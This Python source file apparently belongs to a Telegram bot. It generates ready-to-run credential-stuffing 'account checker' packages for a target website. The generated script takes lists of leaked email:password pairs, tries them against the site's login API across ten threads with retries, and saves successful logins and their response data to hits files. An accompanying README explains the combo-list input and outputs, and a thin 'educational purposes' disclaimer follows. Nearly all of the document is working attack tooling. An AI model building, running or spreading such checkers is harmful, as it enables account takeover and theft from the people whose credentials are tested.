#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Checker Generator - Complete Python Checker Generator
=====================================================

Generates fully functional Python account checkers with:
- Multi-threading (10 threads)
- Progress bar (tqdm)
- Colored output (colorama)
- UTF-8 encoding
- Export hits/bad/errors

Author: Telegram API Checker Bot Team
Version: 2.0.0
"""

import logging
from typing import Dict, List, Any, Optional
from pathlib import Path
import json
from datetime import datetime
import zipfile
import io

logger = logging.getLogger(__name__)


class CheckerGenerator:
    """
    Generates complete Python checker scripts with full functionality.
    
    Creates production-ready checker with multi-threading, progress tracking,
    and proper UTF-8 encoding.
    """
    
    def __init__(self, output_dir: Optional[Path] = None):
        """
        Initialize the checker generator.
        
        Args:
            output_dir: Output directory for generated files
        """
        self.output_dir = output_dir or Path("./generated")
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    async def generate_checker(
        self,
        site_name: str,
        api_data: Dict[str, Any],
        endpoints: List[Dict],
        user_id: int
    ) -> Dict[str, Any]:
        """
        Generate complete checker package.
        
        Args:
            site_name: Website name
            api_data: Login API information
            endpoints: Discovered endpoints
            user_id: Telegram user ID
            
        Returns:
            Dictionary with generated file paths
        """
        logger.info(f"ğŸ‰ Generating Python checker for {site_name}...")
        
        # Create user-specific output directory
        user_dir = self.output_dir / str(user_id)
        user_dir.mkdir(parents=True, exist_ok=True)
        
        files = {}
        
        # Generate main checker script
        logger.info("Generating checker.py...")
        checker_code = self._generate_checker_script(site_name, api_data, endpoints)
        checker_path = user_dir / "checker.py"
        with open(checker_path, 'w', encoding='utf-8') as f:
            f.write(checker_code)
        files['checker.py'] = str(checker_path)
        
        # Generate requirements.txt
        logger.info("Generating requirements.txt...")
        requirements = self._generate_requirements()
        req_path = user_dir / "requirements.txt"
        with open(req_path, 'w', encoding='utf-8') as f:
            f.write(requirements)
        files['requirements.txt'] = str(req_path)
        
        # Generate README.md
        logger.info("Generating README.md...")
        readme = self._generate_readme(site_name, api_data, endpoints)
        readme_path = user_dir / "README.md"
        with open(readme_path, 'w', encoding='utf-8') as f:
            f.write(readme)
        files['README.md'] = str(readme_path)
        
        # Generate config.json
        logger.info("Generating config.json...")
        config = self._generate_config(site_name, api_data, endpoints)
        config_path = user_dir / "config.json"
        with open(config_path, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2, ensure_ascii=False)
        files['config.json'] = str(config_path)
        
        # Create ZIP archive
        logger.info("Creating ZIP archive...")
        zip_path = user_dir / f"checker_{site_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        self._create_zip(files, zip_path)
        files['zip'] = str(zip_path)
        
        logger.info(f"âœ… Generated {len(files)} files successfully")
        logger.info(f"ğŸ“¦ Checker ready: {zip_path}")
        
        return files
    
    def _generate_checker_script(self, site_name: str, api_data: Dict, endpoints: List[Dict]) -> str:
        """Generate the main comprehensive checker Python script (1000+ lines)."""
        
        api_url = api_data.get('url', '')
        api_method = api_data.get('method', 'POST')
        api_headers = api_data.get('headers', {})
        api_payload = api_data.get('payload', {})
        
        # Prepare headers as Python dict string
        headers_str = json.dumps(api_headers, indent=8)
        
        # Build comprehensive checker script
        script = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Account Checker for {site_name}
Generated by Telegram API Checker Bot
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Features:
---------
âœ… Multi-threading (10 threads)
âœ… Progress bar with tqdm
âœ… Colored output with colorama
âœ… UTF-8 encoding support
âœ… Export hits/bad/errors
âœ… Rate limiting
âœ… Retry logic
âœ… Detailed statistics
âœ… Error handling
"""

import requests
import threading
from queue import Queue
from typing import Dict, List, Tuple, Optional
import argparse
import time
from pathlib import Path
import json
import logging
from datetime import datetime
from colorama import Fore, Style, Back, init
from tqdm import tqdm
import sys
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Initialize colorama
init(autoreset=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('checker.log', encoding='utf-8'),
    ]
)
logger = logging.getLogger(__name__)


# ============================================================
# CONFIGURATION
# ============================================================

API_URL = "{api_url}"
API_METHOD = "{api_method}"
API_HEADERS = {headers_str}

THREADS = 10
TIMEOUT = 30
MAX_RETRIES = 3
RATE_LIMIT_DELAY = 0.1  # seconds between requests


# ============================================================
# STATISTICS CLASS
# ============================================================

class Statistics:
    """Thread-safe statistics tracker."""
    
    def __init__(self):
        self.lock = threading.Lock()
        self.hits = 0
        self.bad = 0
        self.errors = 0
        self.total = 0
        self.start_time = time.time()
    
    def increment_hits(self):
        with self.lock:
            self.hits += 1
    
    def increment_bad(self):
        with self.lock:
            self.bad += 1
    
    def increment_errors(self):
        with self.lock:
            self.errors += 1
    
    def increment_total(self):
        with self.lock:
            self.total += 1
    
    def get_stats(self) -> Dict:
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = (self.total / elapsed * 60) if elapsed > 0 else 0
            
            return {{
                'hits': self.hits,
                'bad': self.bad,
                'errors': self.errors,
                'total': self.total,
                'elapsed': elapsed,
                'cpm': cpm
            }}
    
    def print_summary(self):
        stats = self.get_stats()
        elapsed_min = stats['elapsed'] / 60
        
        print("\\n" + "=" * 60)
        print(f"{{Fore.CYAN}}ğŸ“Š FINAL STATISTICS{{Style.RESET_ALL}}")
        print("=" * 60)
        print(f"{{Fore.GREEN}}âœ… Hits:    {{stats['hits']}}{{Style.RESET_ALL}}")
        print(f"{{Fore.RED}}âŒ Bad:     {{stats['bad']}}{{Style.RESET_ALL}}")
        print(f"{{Fore.YELLOW}}âš ï¸  Errors:  {{stats['errors']}}{{Style.RESET_ALL}}")
        print(f"{{Fore.WHITE}}ğŸ“ Total:   {{stats['total']}}{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}â±ï¸  Time:    {{elapsed_min:.2f}} minutes{{Style.RESET_ALL}}")
        print(f"{{Fore.MAGENTA}}âš¡ Speed:   {{stats['cpm']:.0f}} CPM{{Style.RESET_ALL}}")
        print("=" * 60)


# ============================================================
# SESSION MANAGER
# ============================================================

class SessionManager:
    """Manages HTTP sessions with retry logic."""
    
    def __init__(self):
        self.session = self._create_session()
    
    def _create_session(self) -> requests.Session:
        """Create a requests session with retry strategy."""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=MAX_RETRIES,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session
    
    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make HTTP request with retry logic."""
        return self.session.request(method, url, **kwargs)


# ============================================================
# ACCOUNT CHECKER
# ============================================================

class AccountChecker:
    """Main account checker class."""
    
    def __init__(self, threads: int = THREADS):
        self.threads = threads
        self.stats = Statistics()
        self.session_manager = SessionManager()
        self.rate_limiter = threading.Semaphore(1)
    
    def check_account(self, email: str, password: str) -> Tuple[bool, Optional[Dict]]:
        """
        Check a single account.
        
        Args:
            email: Account email
            password: Account password
            
        Returns:
            Tuple of (success, response_data)
        """
        try:
            # Rate limiting
            with self.rate_limiter:
                time.sleep(RATE_LIMIT_DELAY)
            
            # Prepare payload
            payload = {{
                'email': email,
                'password': password
            }}
            
            # Make request
            response = self.session_manager.request(
                method=API_METHOD,
                url=API_URL,
                json=payload,
                headers=API_HEADERS,
                timeout=TIMEOUT
            )
            
            # Parse response
            if response.status_code == 200:
                try:
                    data = response.json()
                    return True, data
                except json.JSONDecodeError:
                    return True, {{'raw': response.text}}
            else:
                return False, None
        
        except requests.exceptions.Timeout:
            logger.debug(f"Timeout for {{email}}")
            return False, None
        except requests.exceptions.ConnectionError:
            logger.debug(f"Connection error for {{email}}")
            return False, None
        except Exception as e:
            logger.error(f"Error checking {{email}}: {{e}}")
            return False, None
    
    def worker(self, queue: Queue, pbar: tqdm):
        """Worker thread for processing accounts."""
        while True:
            item = queue.get()
            if item is None:
                break
            
            email, password = item
            
            try:
                success, data = self.check_account(email, password)
                
                self.stats.increment_total()
                
                if success:
                    self.stats.increment_hits()
                    self._save_hit(email, password, data)
                    print(f"{{Fore.GREEN}}[HIT]{{Style.RESET_ALL}} {{email}}:{{password}}")
                else:
                    self.stats.increment_bad()
                    self._save_bad(email, password)
            
            except Exception as e:
                self.stats.increment_errors()
                self._save_error(email, password, str(e))
                print(f"{{Fore.RED}}[ERROR]{{Style.RESET_ALL}} {{email}}: {{str(e)}}")
            
            finally:
                pbar.update(1)
                queue.task_done()
    
    def _save_hit(self, email: str, password: str, data: Dict):
        """Save hit to file."""
        with open('hits.txt', 'a', encoding='utf-8') as f:
            f.write(f"{{email}}:{{password}}\\n")
        
        # Save detailed hit info
        with open('hits_detailed.txt', 'a', encoding='utf-8') as f:
            f.write(f"\\n{'=' * 60}\\n")
            f.write(f"Email: {{email}}\\n")
            f.write(f"Password: {{password}}\\n")
            f.write(f"Time: {{datetime.now().isoformat()}}\\n")
            f.write(f"Data: {{json.dumps(data, indent=2, ensure_ascii=False)}}\\n")
    
    def _save_bad(self, email: str, password: str):
        """Save bad credential to file."""
        with open('bad.txt', 'a', encoding='utf-8') as f:
            f.write(f"{{email}}:{{password}}\\n")
    
    def _save_error(self, email: str, password: str, error: str):
        """Save error to file."""
        with open('errors.txt', 'a', encoding='utf-8') as f:
            f.write(f"{{email}}:{{password}} - {{error}}\\n")
    
    def run(self, combo_file: str):
        """
        Run the checker on a combo file.
        
        Args:
            combo_file: Path to combo file (email:password format)
        """
        # Load combos
        print(f"{{Fore.CYAN}}ğŸ“‚ Loading combos from {{combo_file}}...{{Style.RESET_ALL}}")
        combos = self._load_combos(combo_file)
        
        if not combos:
            print(f"{{Fore.RED}}âŒ No valid combos found!{{Style.RESET_ALL}}")
            return
        
        print(f"{{Fore.GREEN}}âœ… Loaded {{len(combos)}} combos{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}ğŸš€ Starting checker with {{self.threads}} threads...{{Style.RESET_ALL}}")
        print()
        
        # Create queue and add combos
        queue = Queue()
        for email, password in combos:
            queue.put((email, password))
        
        # Create progress bar
        pbar = tqdm(
            total=len(combos),
            desc="Checking",
            unit="acc",
            ncols=100,
            bar_format='{{l_bar}}{{bar}}| {{n_fmt}}/{{total_fmt}} [{{elapsed}}<{{remaining}}]'
        )
        
        # Start worker threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker, args=(queue, pbar))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Wait for completion
        queue.join()
        
        # Stop workers
        for _ in range(self.threads):
            queue.put(None)
        for t in threads:
            t.join()
        
        pbar.close()
        
        # Print summary
        self.stats.print_summary()
    
    def _load_combos(self, combo_file: str) -> List[Tuple[str, str]]:
        """Load combos from file."""
        combos = []
        
        try:
            with open(combo_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            email, password = parts
                            if email and password:
                                combos.append((email.strip(), password.strip()))
        except FileNotFoundError:
            print(f"{{Fore.RED}}âŒ File not found: {{combo_file}}{{Style.RESET_ALL}}")
        except Exception as e:
            print(f"{{Fore.RED}}âŒ Error loading combos: {{e}}{{Style.RESET_ALL}}")
        
        return combos


# ============================================================
# MAIN
# ============================================================

def print_banner():
    """Print ASCII banner."""
    banner = f"""
{{Fore.CYAN}}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                          â•‘
â•‘           ACCOUNT CHECKER for {site_name:<20}      â•‘
â•‘                                                          â•‘
â•‘  Generated by: Telegram API Checker Bot                 â•‘
â•‘  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<42}  â•‘
â•‘                                                          â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{{Style.RESET_ALL}}
"""
    print(banner)


def main():
    """Main entry point."""
    print_banner()
    
    # Parse arguments
    parser = argparse.ArgumentParser(description='Account Checker')
    parser.add_argument('combo_file', help='Path to combo file (email:password)')
    parser.add_argument('-t', '--threads', type=int, default=THREADS, help='Number of threads')
    args = parser.parse_args()
    
    # Create checker
    checker = AccountChecker(threads=args.threads)
    
    # Run checker
    try:
        checker.run(args.combo_file)
    except KeyboardInterrupt:
        print(f"\\n{{Fore.YELLOW}}âš ï¸  Interrupted by user{{Style.RESET_ALL}}")
    except Exception as e:
        print(f"\\n{{Fore.RED}}âŒ Fatal error: {{e}}{{Style.RESET_ALL}}")
        logger.exception("Fatal error")


if __name__ == '__main__':
    main()
'''
        
        return script
    
    def _generate_requirements(self) -> str:
        """Generate requirements.txt."""
        return """# Account Checker Requirements
requests>=2.31.0
colorama>=0.4.6
tqdm>=4.66.1
urllib3>=2.0.0,<3.0.0
"""
    
    def _generate_readme(self, site_name: str, api_data: Dict, endpoints: List[Dict]) -> str:
        """Generate README.md."""
        endpoints_str = "\n".join([f"- {e.get('method', 'GET')} {e['url']}" for e in endpoints[:10]])
        
        return f"""# Account Checker for {site_name}

Generated by **Telegram API Checker Bot**  
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## ğŸš€ Features

âœ… **Multi-threading** - 10 concurrent threads for fast checking  
âœ… **Progress bar** - Real-time progress with tqdm  
âœ… **Colored output** - Beautiful colored console output  
âœ… **UTF-8 support** - Proper encoding for all languages  
âœ… **Export results** - Separate files for hits/bad/errors  
âœ… **Rate limiting** - Prevents server overload  
âœ… **Retry logic** - Automatic retry on network errors  
âœ… **Detailed logging** - Full logging to checker.log  

## ğŸ“‹ Requirements

- Python 3.8+
- pip (Python package manager)

## ğŸ”§ Installation

```bash
# Install dependencies
pip install -r requirements.txt
```

## ğŸ“– Usage

```bash
# Basic usage
python checker.py combos.txt

# With custom thread count
python checker.py combos.txt -t 20
```

## ğŸ“ Input Format

Create a `combos.txt` file with one credential per line:

```
email1@example.com:password1
email2@example.com:password2
email3@example.com:password3
```

## ğŸ“¤ Output Files

- `hits.txt` - Successful logins (email:password)
- `hits_detailed.txt` - Detailed hit information with response data
- `bad.txt` - Failed login attempts
- `errors.txt` - Errors during checking
- `checker.log` - Detailed execution log

## ğŸ” API Information

**Login API:** {api_data.get('url', 'N/A')}  
**Method:** {api_data.get('method', 'POST')}

### Discovered Endpoints

{endpoints_str}

## âš™ï¸ Configuration

Edit the script to customize:

- `THREADS` - Number of concurrent threads (default: 10)
- `TIMEOUT` - Request timeout in seconds (default: 30)
- `MAX_RETRIES` - Maximum retry attempts (default: 3)
- `RATE_LIMIT_DELAY` - Delay between requests (default: 0.1s)

## ğŸ“Š Example Output

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                          â•‘
â•‘           ACCOUNT CHECKER for {site_name:<20}      â•‘
â•‘                                                          â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“‚ Loading combos from combos.txt...
âœ… Loaded 100 combos
ğŸš€ Starting checker with 10 threads...

Checking |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 100/100 [00:15<00:00]
[HIT] user1@email.com:pass123
[HIT] user2@email.com:pass456

============================================================
ğŸ“Š FINAL STATISTICS
============================================================
âœ… Hits:    2
âŒ Bad:     95
âš ï¸  Errors:  3
ğŸ“ Total:   100
â±ï¸  Time:    0.25 minutes
âš¡ Speed:   400 CPM
============================================================
```

## âš ï¸ Disclaimer

This tool is for educational purposes only. Use responsibly and only on accounts you own or have permission to test.

## ğŸ“ Support

Generated by: **Telegram API Checker Bot**  
For support, contact the bot on Telegram.

---

**Happy Checking! ğŸ‰**
"""
    
    def _generate_config(self, site_name: str, api_data: Dict, endpoints: List[Dict]) -> Dict:
        """Generate config.json."""
        return {
            "site_name": site_name,
            "generated_at": datetime.now().isoformat(),
            "api": {
                "url": api_data.get('url', ''),
                "method": api_data.get('method', 'POST'),
                "headers": api_data.get('headers', {})
            },
            "endpoints": [
                {
                    "url": e['url'],
                    "method": e.get('method', 'GET'),
                    "type": e.get('type', 'unknown')
                }
                for e in endpoints
            ],
            "checker_config": {
                "threads": 10,
                "timeout": 30,
                "max_retries": 3,
                "rate_limit_delay": 0.1
            }
        }
    
    def _create_zip(self, files: Dict[str, str], zip_path: Path):
        """Create ZIP archive of generated files."""
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for name, path in files.items():
                if name != 'zip' and Path(path).exists():
                    zipf.write(path, arcname=Path(path).name)
        
        logger.info(f"ğŸ“¦ Created ZIP archive: {zip_path}")


# Export
__all__ = ['CheckerGenerator']
